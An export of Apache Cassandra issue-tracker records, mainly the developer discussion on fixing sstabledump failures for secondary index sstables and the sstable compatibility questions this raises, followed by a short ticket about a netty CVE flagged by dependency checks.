        at java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:482)
        at java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:472)
        at java.util.stream.ForEachOps$ForEachOp.evaluateSequential(ForEachOps.java:150)
        at java.util.stream.ForEachOps$ForEachOp$OfRef.evaluateSequential(ForEachOps.java:173)
        at java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:234)
        at java.util.stream.ReferencePipeline.forEach(ReferencePipeline.java:485)
        at org.apache.cassandra.tools.JsonTransformer.toJson(JsonTransformer.java:113)
        at org.apache.cassandra.tools.SSTableExport.main(SSTableExport.java:214)
{code};;;","04/Aug/22 06:48;maxwellguo;Just have this problem  for me now , vesion is :  trunk and 3.11.4, Assign this issue to me now .;;;","13/Oct/22 03:53;maxwellguo;Hi [~smiklosovic][~brandon.williams] [~adelapena], I find the reason of the bug and it is because that the CassandraIndex -> indexCfsMetadata build the index table meta at the first clustering key  with PartitionerDefinedOrder which have not implement toJSONString method , see https://github.com/apache/cassandra/blob/trunk/src/java/org/apache/cassandra/index/internal/CassandraIndex.java#L743

I have fixed the bug , and done some test with index sstable dump. Now I want to add some unit test for this like https://github.com/apache/cassandra/blob/trunk/test/unit/org/apache/cassandra/tools/SSTableExportSchemaLoadingTest.java  ,But I just find some exists sstables in test dir , they are here https://github.com/apache/cassandra/tree/trunk/test/data/legacy-sstables/nb/legacy_tables
But I need to add some sstable for secondary index , My question is : How does this sstables been created ? What I am going to do is just create index sstable locally and upload to github at this commit and then the ut can use them ?;;;","13/Oct/22 09:01;smiklosovic;Hi [~maxwellguo],

thanks for the patch! This is a good question. I would say that we should not add upload / commit sstables into the repository. I think the main reason these legacy tables were uploaded there was that Cassandra can not create them anymore (well, because it is ""legacy""). But we still want to parse them.

Ideally, you should create these sstables in the test and then run the tool against them. So we know that, as Cassandra is being developed, it knows how to export it - sstables would be always the current ones.

There is a lot of helper methods on org.apache.cassandra.SchemaLoader for creating keyspaces, tables and indexes on them with some predefined schema. Then you would populate that table (hence index) with data.

You can look into SSTableLoaderTest where in ""defineSchema"" method the schema is created (definitely just pick what you find necessary). Then you may look into ""testLoadingSSTable"" method in the same class, at the beginning it writes some rows via CQLSSTableWriter. Do not forget to flush it via Util.flush(cfs); as shown in that method.

I would put all of this into ""SSTableExportSchemaLoadingTest"" as a new test method. You may create a dedicated class as well in the same package SSTableExportSchemaLoadingTest is. I can imagine that there will be  lot of variations of indexes and we should be able to test that every index type is dumpable. 

If you look into SchemaLoader.schemaDefinition, there you see it creates basically all keyspaces / indexes / counter caches and so on. We should be able to verify that we can dump all of them via that tool.

;;;","18/Oct/22 14:39;maxwellguo;[~smiklosovic]I just use CQLTester and create a new class called SecondaryIndexSSTableExportTest and make ddl through createtable and createindex mthod and insert data through execute method. 
For that I think use this I can make a integration test so that the modification of CassandraIndex can also be tested. 

code is : [cassandra-17698 |https://github.com/apache/cassandra/commit/ab3884a197d398d7c94f6fe580b7d631c00b0c46]
test is [ci |https://app.circleci.com/pipelines/github/Maxwell-Guo/cassandra];;;","18/Oct/22 15:00;smiklosovic;Hi [~maxwellguo] , could you please prepare this PR for the first branch it ever appeared in? You said you hit this issue in 3.11.4. What is the first version this bug is in? Once we fix this in the branch it appeared first, we need to apply it to all newer branches. I do not know how to merge trunk to older branches but I know how to merge older branch to newer ones.;;;","19/Oct/22 15:45;maxwellguo;[~smiklosovic]Hi, I saw that the first version that occurs the bug is 3.4 but after I try to prepare the PR on cassandra-3.4 , I found that may if we fix the bug on trunk  at the next c* release version is ok ? For the test for this patch can not be created for some of the test tool like ToolRunner is introduce at 4.x ? So if we can just fix this bug for trunk ? 
Besides I have a new question here: for the example :
1.CREATE TABLE table (id text PRIMARY KEY, birth_year int)
2.CREATE INDEX on table (birth_year)
3.INSERT INTO  table (id, birth_year) VALUES ('Tom', 42)
4.INSERT INTO table (id, birth_year) VALUES ('Paul', 24)
5.INSERT INTO table (id, birth_year) VALUES ('Bob', 42)

now IF I doing : SELECT id FROM  table WHERE birth_year = 42
which result is right ? 
(a) ""Tom"", ""Bob""
(b) ""Bob"", ""Tom""

We know that the clustering key for index table is consist of data table's partition key + data table's clustering key + data cell . [~brandon.williams][~smiklosovic]
;;;","19/Oct/22 16:04;smiklosovic;Hi [~maxwellguo],

so, in case it was first in 3.4, we fix it for cassandra-3.11 branch up. We support 3.0.x, 3.11.x, 4.0, 4.1 and trunk. 3.4 is after 3.0 and before 3.11 so 3.11 is the branch we should fix that for first. Do you say that this bug is not in 3.0.x then? Thanks for verifying that!

Both results are right. I do not think the order matters.

I do not understand your comment about ToolRunner. Can you please repeat that question? ;;;","19/Oct/22 19:10;brandon.williams;bq. We support 3.0.x, 3.11.x, 4.0, 4.1 and trunk. 3.4 is after 3.0 and before 3.11 so 3.11 is the branch we should fix that for first. Do you say that this bug is not in 3.0.x then? 

This is correct.;;;","20/Oct/22 02:55;maxwellguo;Hi [~smiklosovic], after verifying agagin , the details are :
For tag : the bug was first introduce in tag : cassandra-3.0.4 and all cassandra 3.0.x have this bug , but for tag 3.1.x to 3.3 the patch is not exist bug introduce the bug agagin in 3.4 till 4.x . I saw that for 3.4 we merge some feature from 3.0 so the bug was introduce.

For branch : 3.0 the bug not exist but 3.11 to 4.x the bug exist. 

why I ask the question for the result order is that I found some ut is failed. the reason is the order of result for the clustering key type (my patch modify the clustering type from PartitionerDefinedOrder to the real data clustering type , so the result slected is changed ,but I think 
the order should be same with real clustering key type ordered. see https://github.com/apache/cassandra/blob/trunk/test/unit/org/apache/cassandra/cql3/validation/entities/SecondaryIndexTest.java#L204)

For ToolRunner what I means is  the ut for tools like sstableexport , there introduce ToolRunner to make the ut code.  and ToolRunner code seems only in trunk and 4.x ，So for 3.x the prepared PR may got no ut for this :( ,So I want to know if we can just fix this in trunk or some 4.x version. ;;;","20/Oct/22 14:15;smiklosovic;Hi [~maxwellguo]

what I understand is that this is ultimately in 3.0.x as well. We should then fix this in 3.0 and prepare a PR for it. Let's prepare a PR for branch cassandra-3.0 and we will eventually see how it might be applied to newer branches. I think it is too premature to discuss it in such a detail yet. Lets create a branch for 3.0 and we take it from there. What do you think?;;;","21/Oct/22 01:56;maxwellguo;OK ;;;","26/Oct/22 08:05;maxwellguo;[pr for trunk |https://github.com/Maxwell-Guo/cassandra/commit/df7743b717608889b27224ff285de8e187ba795d]
[trunk ci | https://app.circleci.com/pipelines/github/Maxwell-Guo/cassandra?branch=trunk]
[pr for cassandra-3.0|https://github.com/Maxwell-Guo/cassandra/commit/90c94730abe30f382c924da7512e3c1282c1f007]

[~smiklosovic] The pr for trunk I have made a ut test and the test passed , but for pr of casandra-3.0 I do not add some ut for sstable dump for at branch cassandra-3.0 there do not exist some ut tool for tools like sstabledump ,I just make a ut test for my pr of cassandra-3.0 at my local machine because I have not found some way for add test for a new branch (sorry for not use circle ci for a long time). 

[~blambov] hi, can you help to look at this patch too, I saw the class was once modified by you ? for PartitionerDefinedOrder I just add a baseType when secondary index init cfmeta and the baseType was set to be the original data table's partitionkey type. So I modify the PartitionerDefinedOrder toString method and the TypeParser  so that the metadata can deserialize and serialize the baseType in PartitionerDefinedOrder. 

Thank you all . [~smiklosovic][~brandon.williams][~blambov]:D;;;","26/Oct/22 10:19;blambov;Added some comments on the 3.0 commit. Why do we need a patch for 3.0 if the problem is not present there?;;;","26/Oct/22 10:25;smiklosovic;I am reading this comment of Maxwell

For tag : the bug was first introduce in tag : cassandra-3.0.4 and all cassandra 3.0.x have this bug , but for tag 3.1.x to 3.3 the patch is not exist bug introduce the bug agagin in 3.4 till 4.x . I saw that for 3.4 we merge some feature from 3.0 so the bug was introduce.

For branch : 3.0 the bug not exist but 3.11 to 4.x the bug exist.

He said in the first sentence 3.0.x has that bug. ;;;","31/Oct/22 12:44;maxwellguo;||Heading 1||Heading 2||
|trunk |[trunk|https://github.com/apache/cassandra/commit/655c02e872e61116705b526be2401ea51a736b4f]|
|trunk ci |[ci |https://app.circleci.com/pipelines/github/Maxwell-Guo/cassandra/313/workflows/f3425952-af44-4c5d-9241-2c5e485988f9]|
|3.0|[3.0|https://github.com/apache/cassandra/commit/2be8e841df1b35faeec0b863fe577ae041310b58]|
|3.0 ci|[ci|https://app.circleci.com/pipelines/github/Maxwell-Guo/cassandra/314/workflows/fc79135b-8a84-4364-8996-53d8afd17e27]|

[~blambov]make some new code update after reading the comment. thank you for review code for me .;;;","07/Nov/22 11:49;maxwellguo;update agagin 
[~blambov] [~smiklosovic] [~brandon.williams]can anyone help with this patch ? my patch have some update on 3.0 and trunk :D;;;","07/Nov/22 15:24;brandon.williams;[~maxwellguo] if this is a bug in 3.0, then we need fixes for 3.0, 3.11, 4.0, 4.1, and trunk.;;;","08/Nov/22 10:20;blambov;[~maxwellguo], could you open a pull requests against the relevant branch in apache/cassandra, so that the comments made can be tracked in a single place? I suggest starting with the 3.0 version, working through the review, and then merging it forward to the other branches to run CI.;;;","11/Nov/22 06:47;maxwellguo;3.x have some differenece with 4.x and trunk for 3.x do not have the ToolRunner.java class , so some the ut for Tools like SStableExport can not be made. But for trunk and 4.x I add some ut for the SStableExport with secondaryIndex sstable
[3.0-pr|https://github.com/apache/cassandra/pull/1998]
[3.11-pr|https://github.com/apache/cassandra/pull/2002]
[4.0-pr|https://github.com/apache/cassandra/pull/2003]
[4.1-pr|https://github.com/apache/cassandra/pull/2004]
[trunk-pr|https://github.com/apache/cassandra/pull/2005]

I have also fix this bug for 3.11 /4.0/4.1 and trunk 


[~blambov][~brandon.williams] and [~jasonstack];;;","15/Nov/22 07:27;maxwellguo;hi [~blambov], I just update the patch for 3.0 
https://github.com/apache/cassandra/pull/1998/commits

and close the pr for other branch , will be open latter.;;;","12/Jan/23 08:44;blambov;The patch looks good to me.

[~maxwellguo] , could you change the ticket status and add all required data?;;;","12/Jan/23 09:28;maxwellguo;[~blambov], Thanks, I change the status to ""Need Committer"" , if it is right ?
And some version to fix is also added.
[~smiklosovic]Can you help to to take a look ? Thanks;;;","13/Jan/23 14:40;maxwellguo;[~blambov][~smiklosovic]
[3.0|https://github.com/apache/cassandra/compare/trunk...Maxwell-Guo:cassandra:CASSANDRA-17698-3.0] and [~blambov] +1 's patch link [patch|https://github.com/apache/cassandra/pull/1998]
[3.11|https://github.com/apache/cassandra/compare/cassandra-3.11...Maxwell-Guo:cassandra:CASSANDRA-17698-3.11]
[4.0|https://github.com/apache/cassandra/compare/cassandra-4.0...Maxwell-Guo:cassandra:CASSANDRA-17698-4.0]
[4.1|https://github.com/apache/cassandra/compare/cassandra-4.1...Maxwell-Guo:cassandra:CASSANDRA-17698-4.1]
[trunk|https://github.com/apache/cassandra/compare/trunk...Maxwell-Guo:cassandra:CASSANDRA-17698-trunk]

java8 precommit :
[trunk|https://app.circleci.com/pipelines/github/Maxwell-Guo/cassandra/381/workflows/abc96440-efcb-46f7-ac80-7610af8982a8]
[4.1|https://app.circleci.com/pipelines/github/Maxwell-Guo/cassandra/382/workflows/014166a5-860e-48f3-a5c0-e7f93810dad8]
[4.0|https://app.circleci.com/pipelines/github/Maxwell-Guo/cassandra/383/workflows/b954f510-75ce-4830-86f4-0f271e8b1b57]
[3.11|https://app.circleci.com/pipelines/github/Maxwell-Guo/cassandra/384/workflows/66938b6e-9a1c-4b62-8505-61e98cedc8e6]
java11 precommit :
[trunk|https://app.circleci.com/pipelines/github/Maxwell-Guo/cassandra/381/workflows/ac333054-47d6-4b9b-a43f-b80904fb8b89]
[4.1|https://app.circleci.com/pipelines/github/Maxwell-Guo/cassandra/382/workflows/2b368971-5aaa-4c98-8eb9-6136b235be45]
[4.0|https://app.circleci.com/pipelines/github/Maxwell-Guo/cassandra/383/workflows/4baaacad-0933-4ffe-9557-9ca6a985609c]

for my testing resource is limited ,so it may take some time to see the result.:(
;;;","17/Jan/23 10:16;smiklosovic;[~adelapena] I am not too strong in indexes this ticket touches. Would you mind to be the second reviewer here? I think it is mostly just a formality.;;;","17/Jan/23 16:12;adelapena;I'm not that familiarized with that part of the indexes. However, I still can reproduce the issue with patched 3.0 if the table uses a composite partition key:
{code}
cqlsh> CREATE KEYSPACE k WITH replication = {'class': 'SimpleStrategy', 'replication_factor': 1};
cqlsh> CREATE TABLE k.t ( k1 int, k2 int, v int, primary key ((k1, k2)));
cqlsh> CREATE INDEX IF NOT EXISTS ON k.t(v);
cqlsh> INSERT INTO k.t (k1, k2, v ) VALUES (1, 2, 3);
$ bin/nodetool flush
$ tools/bin/sstabledump data/data/k/t-aa18d300967f11ed8c91c741e12777ed/.t_v_idx/me-1-big-Data.db
[
  {
    ""partition"" : {
      ""key"" : [ ""3"" ],
      ""position"" : 0
    },
    ""rows"" : [
      {
        ""type"" : ""row"",
        ""position"" : 18,
        ""clustering"" : [ ] } ] } ]Exception in thread ""main"" java.lang.UnsupportedOperationException
	at org.apache.cassandra.db.marshal.AbstractCompositeType.toJSONString(AbstractCompositeType.java:252)
	at org.apache.cassandra.db.marshal.PartitionerDefinedOrder.toJSONString(PartitionerDefinedOrder.java:92)
	at org.apache.cassandra.tools.JsonTransformer.serializeClustering(JsonTransformer.java:353)
	at org.apache.cassandra.tools.JsonTransformer.serializeRow(JsonTransformer.java:249)
	at org.apache.cassandra.tools.JsonTransformer.serializePartition(JsonTransformer.java:217)
	at java.util.stream.ForEachOps$ForEachOp$OfRef.accept(ForEachOps.java:184)
	at java.util.stream.ReferencePipeline$2$1.accept(ReferencePipeline.java:175)
	at java.util.Iterator.forEachRemaining(Iterator.java:116)
	at java.util.Spliterators$IteratorSpliterator.forEachRemaining(Spliterators.java:1801)
	at java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:482)
	at java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:472)
	at java.util.stream.ForEachOps$ForEachOp.evaluateSequential(ForEachOps.java:151)
	at java.util.stream.ForEachOps$ForEachOp$OfRef.evaluateSequential(ForEachOps.java:174)
	at java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:234)
	at java.util.stream.ReferencePipeline.forEach(ReferencePipeline.java:418)
	at org.apache.cassandra.tools.JsonTransformer.toJson(JsonTransformer.java:104)
	at org.apache.cassandra.tools.SSTableExport.main(SSTableExport.java:253)
{code}
So it seems we are still missing something. If I'm right the patch avoids calling the unimplemented {{AbstractCompositeType#toJSONString}}, which only works if the partition key base type is not an actual composite. 
 ;;;","17/Jan/23 16:18;maxwellguo;you are right，that why my test case lack of the composite type ，but I think that should open another jira which is to implement the tojsonsting for compositetyep（I found this problem at test step，but In my mind，it is more suitable to fix the problem in a new jira，so I left it unfixed）.This is just for partitionorder type.;;;","17/Jan/23 16:19;maxwellguo;And I will open another jira after this one ;;;","17/Jan/23 20:39;maxwellguo;[~adelapena] ;;;","18/Jan/23 10:00;maxwellguo;[~adelapena]a new version is updated after your comments ,Thanks ;;;","18/Jan/23 11:59;adelapena;Fixing {{AbstractCompositeType#toJSONString}} on a separate ticket works for me.

The fix changes what is written on the sstables without changing their version. It's done in a way that patched C* instances will be able to read the index sstables produced by unpatched versions. However the opposite doesn't happen, so an unpatched version won't be able to read the index sstables produced by a patched version. 

I think that shouldn't be a problem during rolling upgrades, since index sstables are not streamed between nodes. Also, in case of wanting to downgrade to an unpatched version, users would need to delete those index sstables and reindex. [~smiklosovic] [~blambov] wdyt?;;;","18/Jan/23 13:55;maxwellguo;""Fixing AbstractCompositeType#toJSONString on a separate ticket works for me.""
 [~adelapena]
see https://issues.apache.org/jira/browse/CASSANDRA-18177
;;;","20/Jan/23 10:23;blambov;{quote}The fix changes what is written on the sstables without changing their version. It's done in a way that patched C* instances will be able to read the index sstables produced by unpatched versions. However the opposite doesn't happen, so an unpatched version won't be able to read the index sstables produced by a patched version.{quote}

Ouch, I missed the fact that we are introducing an incompatibility. It doesn't sound to me like a change that's acceptable for a patch release.

I thought we could work around the problem by taking advantage of some imprecision of the existing code: it accepts specifications of the form {{PartitionerDefinedOrder(x=y)}} and ignores {{y}}. However, {{y}} can only be a single identifier, and the base type will often be complex.

Should we limit the scope of this patch to 4.2/5.0?;;;","20/Jan/23 13:25;adelapena;[~blambov] Making it a 4.2/5.0-only fix makes sense to me.

As for previous branches, I wonder whether it would make sense to make {{PartitionerDefinedOrder#toJSONString(ByteBuffer, ProtocolVersion)}} return a special string that doesn't require deserialization, like the hex representation of the {{{}ByteBuffer{}}}. That at least would print something without breaking the rest of the json conversion, and it would be possible to somewhat use {{sstabledump}} on 2i sstables. The problem is that the returned string could be confused with the real deserialized value of a text key, and it might not play well with {{fromJson}} methods.;;;","20/Jan/23 13:56;maxwellguo;[~adelapena] In that way，should we separate this issue to two？one for what you said return a special string do not require deserialization ，one is what i have done that is better to fix in 4.2/5.0;;;","27/Jan/23 11:25;adelapena;Yes, right. The current patch would go to trunk, and the older branches would just return the serialised value in {{PartitionerDefinedOrder#toJSONString(ByteBuffer, ProtocolVersion)}} without changing the sstables. [~blambov] does that make sense to you?;;;","27/Jan/23 12:43;blambov;Sounds good to me.;;;","29/Jan/23 03:33;maxwellguo;[~adelapena][~blambov]
what about just fix this patch (what I will doing some modification latter for trunk), and left the older branches unchanged? 
Because I think no matter what kind of special string  , it may confused with the real deserialized value of a text key as [~adelapena]said. So throw an UnSupport exception may be better.;;;","30/Jan/23 06:42;maxwellguo;

[trunk pr|https://github.com/apache/cassandra/pull/2118]
[java8|https://app.circleci.com/pipelines/github/Maxwell-Guo/cassandra/398/workflows/44d8260f-8f58-454d-8867-cd463dd4eb18]
[java11|https://app.circleci.com/pipelines/github/Maxwell-Guo/cassandra/398/workflows/787e6e20-7b79-49f0-82cf-2db1243eb6eb]

the code for trunk is almost same with code for 3.0 that [~blambov]have +1 , besides there are some other uts for secondarindex sstable dump. 

[~blambov][~adelapena] can you help to look at it again ?  and for older branches I just left unchanged as I said yesterday .wdyt ? [~adelapena][~blambov];;;","02/Feb/23 11:19;adelapena;The patch mostly looks good to me. However, it changes the sstables in a way that breaks backward compatibility. Thus, sstables created with the patched version would produce a server startup failure with the unpatched version. I understand that requires [a major sstable version bump|https://github.com/apache/cassandra/blob/cassandra-4.1.0/src/java/org/apache/cassandra/io/sstable/format/big/BigFormat.java#L124].

Those type of major sstables changes can only be done on major releases. So the current patch should go in 5.0 only. However, I think we don't have a branch for 5.0. Instead, the current {{trunk}} branch in for 4.2. It seems that it will become 5.0 when we have a breaking change that justifies the bump to a major. That bump to 5.0 is meant to be done in CASSANDRA-17973. See [this mail list discussion|https://www.mail-archive.com/dev@cassandra.apache.org/msg19516.html] for context.
{quote}what about just fix this patch (what I will doing some modification latter for trunk), and left the older branches unchanged?
{quote}
I think we should try to fix the bug for older branches in a way that doesn't break sstables backward compatibility. Possibly by just JSON-printing the failing clustering key as raw bytes, [this way|https://github.com/apache/cassandra/blob/trunk/src/java/org/apache/cassandra/db/marshal/BytesType.java#L70-L73]. If we don't want to do it here we can open a separate ticket and set the fix version of this ticket as 5.0, making this depend on CASSANDRA-17973.

[~blambov] [~smiklosovic] wdyt?;;;","02/Feb/23 12:42;maxwellguo;I think make this fix as 5.0 and open a separate ticket for what you said  to fix bug for older branch is ok for me. and I think that old branches should be 3.0/3.11/4.0/4.1 and trunk.
;;;","02/Feb/23 12:43;maxwellguo;if so I can open new tickets ;;;","08/Feb/23 14:29;maxwellguo;[~blambov]  [~adelapena] [~smiklosovic] any advice on my replied message above？If so I will open a new ticket for older branches.;;;","09/Feb/23 20:13;adelapena;[~maxwellguo] making a separate fix that doesn't need a sstable version bump still sounds good to me.

The current patch can be left for 5.0, or the next major that has a sstable version bump for other reasons. I mean, the current patch is better than the workaround, but neither the bug nor the workaround seem bad enough to justify changing the sstable version only because of that.;;;","10/Feb/23 03:20;maxwellguo;this patch should be applied after the next change version of sstable. maybe CASSANDRA 5.0;;;","20/Feb/23 09:06;benedict;Could somebody ELI5 why this needs to break backwards compatibility?;;;","20/Feb/23 10:49;benedict;(Copied from email reply)
{quote}for old version‘s index data using this version’s dump code ，I think there
will not be much difference（may be only exception message‘s difference），It
is backwards compactibility I think .But I change the content of
sstable（adding a new base type for partitionordertype）.😅{quote}

Could you explain why this needs to change what is written? It's not clear to me, nor from skimming the patch. If this does change what is written it _must_ bump the sstable version, but I'd like to understand what's changing and why, so we can figure out if this needs to be a minor or major bump.;;;","20/Feb/23 12:55;blambov;Before the patch, {{PartitionerDefinedOrder}} provided no information about the type of data that is contained in the clustering key of the index table. As a result it was not possible to print the value for {{{}sstabledump{}}}. This patch adds a base type to the definition of the clustering column type, so that it can be properly interpreted. Since this type definition is not readable by older versions of the code, the header of an sstable written after this patch that contains a clustering column of this type (i.e. a legacy secondary index table) will not be readable by older versions, and thus they will not be able to open the sstable.;;;","20/Feb/23 13:03;maxwellguo;For the original secondary index table just use the original data table's partition key as the first clusting key , but the data type is PartitionerDefinedOrder , but this case do not implement the toJSONString method(I think that is not really data type can be used for this).
So at first I have got two way to fix this problem,
1: add a partitionKeyType in the PartitionerDefinedOrder as this patch described ,but the PartitionerDefinedOrder 's toString result will be store in the meta file of sstable, this way I changed the sstable content;
2.use the partitionkey real type as the secondary index table's first clustering key (not PartitionerDefinedOrder), but this will also change the content of secondary index's table 's sstable file( the old version 's sstable file 's meta store the PartitionerDefinedOrder's toString , now change to data table's paritition key toString ) [here|https://github.com/apache/cassandra/pull/2118/files#diff-a7e8323c9332e6c0d12b0ef92709fa241342fc505a4bdf144b146e9f22cb9adaR738]

Both can solve the problem, and both change the content of sstable.For me I have chosen the first one ,as I use PartitionerDefinedOrder as index's table's first clusting key, and I just want to implement the toJSONString method , for the old version that do not have a paritionKeyType in 
 PartitionerDefinedOrder the original method path can be executed.
Besides, I think this is a low risk modification method, for I do not change the original schema of secondary index(the first clustering key type is still PartitionerDefinedOrder).

;;;","20/Feb/23 13:15;benedict;I see, there is some string parsing from the type info in {{SerializationHeader}}.

Like most of the other recent sstable changes, it seems pretty unnecessary to make a major version bump here, when we could either serialise this additional information to the end of the header, or serialise the type twice (once with extra info).

And arguably, since this is a bug, we really _should_ be doing this so it can be fixed in released versions (though it's a minor bug AFAICT, so probably fine to remain unpatched);;;","06/Mar/23 01:47;maxwellguo;I saw CASSANDRA-17056 change the sstable version to ""g"", so It means this patch do not neet to wait for C* 5.0 ? just can be check int after CASSANDRA-17056 , right ?  [~blambov][~adelapena];;;","08/Mar/23 03:05;maxwellguo;It seems  CASSANDRA-17973 have also been closed, so this patch can be checkin now ? 

[~blambov][~adelapena]:D;;;","08/Mar/23 14:27;adelapena;I don't think that CASSANDRA-17056 has done a major sstable format bump to ""ga"". It seem it's still ""nc"", as it can be seen [here|https://github.com/apache/cassandra/blob/b7e1e44a909c3a1d11e9c387db680c74d31b879f/src/java/org/apache/cassandra/io/sstable/format/big/BigFormat.java#L366]. That hasn't changed with the bump to 5.0 either.

Regarding whether we want to make a major sstable format bump on 5.0 for this, I think that the bug is not so serious to be the only reason to do that bump. But we can always ask on the dev mail list and see what others think.

As for the workaround for older branches, I understand that's to be done in the separate CASSANDRA-18254, but I don't understand why that one is closed as ""Won't Fix"".;;;","16/Mar/23 09:24;maxwellguo;Sorry for the late reply, I didn't notice that the file format version didn't  change yet. I do aggree we should accept the path when the file format come to the next version, as this patch only made a smll change to file content. [~adelapena]
As for CASSANDRA-18254 I  later think may be CASSANDRA-17698 is enough，So I closed it.;;;","05/Jun/23 15:39;adelapena;[~maxwellguo] CASSANDRA-14227 has just added a new ""oa"" sstable major version that can get the changes proposed here. And there is also the new trie format introduced by CASSANDRA-18398.;;;","06/Jun/23 05:39;maxwellguo;[~adelapena] Thanks， I will update the last PR for trunk .;;;","08/Jun/23 04:02;maxwellguo;[pr-trunk-update|https://github.com/apache/cassandra/pull/2118]
[j8-prcommit|https://app.circleci.com/pipelines/github/Maxwell-Guo/cassandra/446/workflows/4570a05e-49e9-438d-8119-6fe96ffeaed9]
[j11-precommit|https://app.circleci.com/pipelines/github/Maxwell-Guo/cassandra/446/workflows/ddbf467a-efb2-4de1-bc35-1b9890cb76e8]
java8 and java11's uts are all green ,but some dtest is not green . I took a look at the failed cases, most of which are related to insufficient resources.
[~adelapena];;;","09/Jun/23 12:47;adelapena;[~maxwellguo] the patch for trunk mostly looks good, but it doesn't check what sstable format version is being used.

Although there is a new ""oa"" version, and also the new trie format, the server can still be using an older format. In fact, the sstable format version depends on the recently added [storage_compatibility_mode|https://github.com/apache/cassandra/blob/trunk/conf/cassandra.yaml#L1979-L2004]. That property defaults to {{CASSANDRA_4}} to keep the data readable for Cassandra 4. So the default sstable format version is still ""nc"" (see [here|https://github.com/apache/cassandra/blob/trunk/src/java/org/apache/cassandra/io/sstable/format/big/BigFormat.java#L356]). The patch changes the meaning of the format, so if it's used on 5.0 with ""na"" format and {{CASSANDRA_4}} compatibility, the written data won't be readable for Cassandra 4.

I think we should simply add a check on {{CassandraIndex}} to preserve the old behaviour if {{DatabaseDescriptor.getStorageCompatibilityMode().isBefore(5)}}.

All unit tests are run with ""nc"", ""oa"" and tries. So probably {{SecondaryIndexSSTableExportTest}} should also take into account the used sstable format.

As for CI, I'll run it with more resources when the compatibility issue is addressed.;;;","09/Jun/23 13:47;maxwellguo;OK，thank you for your reminder. I think this is a very constructive suggestion.I will update this patch latter. [~adelapena] ;;;","14/Jun/23 02:54;maxwellguo;[pr-trunk|https://github.com/apache/cassandra/pull/2118]
[java11|https://app.circleci.com/pipelines/github/Maxwell-Guo/cassandra/452/workflows/8c28fa4e-a4b6-49e5-87f1-50bfbea1a223]
[java8|https://app.circleci.com/pipelines/github/Maxwell-Guo/cassandra/452/workflows/0a5a3e9b-d9a5-49dc-8031-ea89de675712]
java11 's precommit for unit are almost all green ,but dtest are not , and it seems these red are related to insufficient resources; java11's ut for system_keyspace_directory is red, but I run locally , it passed.
java8's dtest are and utests_compression are red, other uts are green , theses dtest are claused by resources, and I ran utests_compression locally , the failed test passed.
So I think it need some more resources for CI  after you +1 on the changes [~adelapena];;;","14/Jun/23 16:48;adelapena;[~maxwellguo] Thanks for the changes.

I have added a couple of suggestions on the PR, put them on [this commit|https://github.com/adelapena/cassandra/commit/989058a17ed5475a24766b52dd2dae19116560e7], and started CI:
||Branch||CI||
|[trunk|https://github.com/adelapena/cassandra/commits/17698-trunk-review-feedback]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2959/workflows/d7bc1213-5a98-48fe-bffc-a20cea35cfef] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/2959/workflows/d1f162cf-9ffa-4da0-9ff7-d9a3b5a35477]|

I'm also reopening CASSANDRA-18254, since we don't have a fix nor a workaround for 3.0, 3.11, 4.0 and 4.1, nor for 5.0 in compatibility mode.

[~blambov] [~smiklosovic] are you ok with the changes?;;;","15/Jun/23 01:51;maxwellguo;Thanks [~adelapena], the ci looks good ,except for [j8 dtest-vnode|https://app.circleci.com/pipelines/github/adelapena/cassandra/2959/workflows/d7bc1213-5a98-48fe-bffc-a20cea35cfef/jobs/50998/parallel-runs/4?filterBy=FAILED]
and it seems this failed case have some relation with [CASSANDRA-18361|https://issues.apache.org/jira/browse/CASSANDRA-18361]
And I am going to address those suggestions.;;;","15/Jun/23 02:36;maxwellguo;||Branch||CI||
|[pr-trunk|https://github.com/apache/cassandra/pull/2118/files#]|[j8|https://app.circleci.com/pipelines/github/Maxwell-Guo/cassandra/456/workflows/466ce173-e875-41c9-9617-7692b328a5d2]  [j11|https://app.circleci.com/pipelines/github/Maxwell-Guo/cassandra/456/workflows/3e09ea27-83e2-43ca-8174-9f0bde48e13e]|
[~blambov][~smiklosovic]Would you mind to take a look agagin? And as for CASSANDRA-18254 I will try to fix it quickly.

This issue seems to be coming to an end;) ;;;","19/Jun/23 08:48;maxwellguo;hello [~adelapena], it seems [~blambov] have approved the pr，can you take a look agagin？;;;","19/Jun/23 11:08;smiklosovic;I am removing myself from this ticket, I dont have a lot of time to review this at the moment.;;;","19/Jun/23 13:01;adelapena;Committed to {{trunk}} as [cc3e742c735daddc29d2fb90aac638c641463d39|https://github.com/apache/cassandra/commit/cc3e742c735daddc29d2fb90aac638c641463d39].;;;"
netty-all 4.0.44 is affected by CVE-2020-7238,CASSANDRA-17697,13450625,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,brandon.williams,brandon.williams,17/Jun/22 13:59,27/Jun/22 16:51,13/Jul/23 08:40,21/Jun/22 14:49,3.0.28,3.11.14,,,,,Dependencies,,,,0,,"{noformat}
Dependency-Check Failure:
One or more dependencies were identified with vulnerabilities that have a CVSS score greater than or equal to '1.0': 
netty-all-4.0.44.Final.jar: CVE-2020-7238
{noformat}

